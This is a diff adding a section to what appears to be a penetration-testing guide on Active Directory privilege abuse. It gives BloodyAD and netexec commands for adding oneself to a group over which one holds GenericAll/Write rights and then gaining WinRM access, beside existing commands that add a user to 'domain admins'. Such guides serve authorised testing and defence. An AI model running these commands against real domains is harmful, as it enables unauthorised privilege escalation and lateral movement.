@@ -42,6 +42,16 @@ Add-ADGroupMember -Identity "domain admins" -Members spotless
 Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
 ```
 
+- From Linux you can also leverage BloodyAD to add yourself into arbitrary groups when you hold GenericAll/Write membership over them. If the target group is nested into “Remote Management Users”, you will immediately gain WinRM access on hosts honoring that group:
+
+```bash
+# Linux tooling example (BloodyAD) to add yourself to a target group
+bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>
+
+# If the target group is member of "Remote Management Users", WinRM becomes available
+netexec winrm <dc-fqdn> -u <user> -p '<pass>'
+```
+
 ## **GenericAll / GenericWrite / Write on Computer/User**
 
 Holding these privileges on a computer object or a user account allows for:
